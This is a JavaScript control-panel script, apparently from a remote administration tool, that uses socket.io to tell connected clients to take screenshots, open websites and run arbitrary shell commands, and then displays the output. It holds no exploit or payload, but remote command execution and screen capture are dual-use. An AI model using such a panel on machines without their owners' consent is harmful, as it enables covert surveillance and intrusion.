
const hideSpinners = () => {
    const systemSpinner = document.querySelectorAll(".systemSpinner");
    for (let i=0; i < systemSpinner.length; i++) {
        systemSpinner[i].style.display = 'none';
    }
}

/*const parseData = (el, data, multi=false) => {
    let htmlData = '';
    if (multi) {
        data.map(item => {
            for (const [key, value] of Object.entries(item)) {
                htmlData += `${key}: ${value}` + "<br>";
            }
        })
    } else {
        for (const [key, value] of Object.entries(data)) {
            htmlData += `${key}: ${value}` + "<br>";
        }
    }

    el.innerHTML = htmlData;
}

const generateSystemInfo =  (data) => {
    const osInfo = document.getElementById('osInfo');
    const cpuInfo = document.getElementById('cpuInfo');
    const gpuInfo = document.getElementById('gpuInfo');
    const diskInfo = document.getElementById('diskInfo');
    hideSpinners();

    const osData = data.os;
    const cpuData = data.cpu;
    const gpuData = data.gpu;
    const diskData = data.disk;

    parseData(osInfo, osData);
    parseData(cpuInfo, cpuData);
    parseData(gpuInfo, gpuData, true);
    parseData(diskInfo, diskData, true);
}
//const osInfoFromLS = JSON.parse(localStorage.getItem('systemInfo'));
(async () => {
    const clientData = await findClientInLocalStorage(clientId);
    console.log(clientData);
    console.log(clientId);
    if (!clientData) {
        await addClientToLocalStorage(clientId);
        sio.emit('getSystemInfoFromClient', {clientId: clientId});
    }
    else
    {
        if (Object.keys(clientData.details).length === 0) {
            sio.emit('getSystemInfoFromClient', {clientId: clientId});
        }
        else
        {
            generateSystemInfo(clientData.details);
        }
    }

})();
*/
const getFormData  = (target) => {
    const formData = new FormData(target)
    let data = {};
    Array.from(formData).map((item) => {
        data[item[0]] = item[1]
    })
    data.clientId = clientId;
    return data;
}

const manageBtnScreenShoot = document.getElementById('manageBtnScreenShoot');
const websiteForm = document.getElementById('websiteForm')
const websiteFormBtn = document.getElementById('websiteFormBtn');
const urlSpinner = document.getElementById('urlSpinner')
const urlInput = document.querySelector('input[name="url"]')
const commandForm = document.getElementById('commandForm');
const commandResult = document.getElementById('commandResult');
const commandFormBtnClear = document.getElementById('commandFormBtnClear');
const selectCommands = document.getElementById('selectCommands');
const commandInput = document.querySelector('input[name="command"]')

manageBtnScreenShoot.addEventListener('click', (e) => {
    sio.emit('screenshoot', {clientId: clientId});
})

websiteForm.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Strona!')
    const data = getFormData(e.target);
    sio.emit('website', data)
})

commandForm.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Komenda');
    const data = getFormData(e.target);
    console.log(data);
    sio.emit('command', data);
})

commandFormBtnClear.addEventListener('click', (e) => {
    commandResult.innerHTML = '';
})

selectCommands.addEventListener('change', (e) => {
    console.log(`Wybrano ${e.target.value}`);
    commandInput.value = e.target.value;
});

/*sio.on('systemInfo', function(data) {
    (async () => {
        await updateClientDetailsLocalStorage(clientId, data);
        generateSystemInfo(data);
    })();
})*/

sio.on('website_btn', function(data) {
    const state = data.state;

    if (!state) {
        websiteFormBtn.disabled = true;
        urlSpinner.style.display = 'block';
        urlInput.value = '';
        urlInput.disabled = true;
    } else {
        websiteFormBtn.disabled = false;
        urlSpinner.style.display = 'none';
        urlInput.disabled = false;
    }

})

sio.on('ss_btn', function(data) {
    const state = data.state;

    if (!state) {
        manageBtnScreenShoot.disabled = true;
    } else {
        manageBtnScreenShoot.disabled = false;
        UIkit.notification({message: 'Pomyslnie zrobiono zrzut ekranu', pos: 'bottom-right', status: 'success'})
    }

})

sio.on('command', (data) => {
    console.log(data.message);
    const resultBody = document.createElement('div');
    resultBody.style.marginBottom = "5px";
    resultBody.style.padding = "2px";
    resultBody.style.borderBottom = '1px solid white';

    resultBody.textContent = data.message;
    commandResult.append(resultBody);
})

sio.on('client_disconnected', (data) => {
    window.location.href = "http://localhost:3000";
});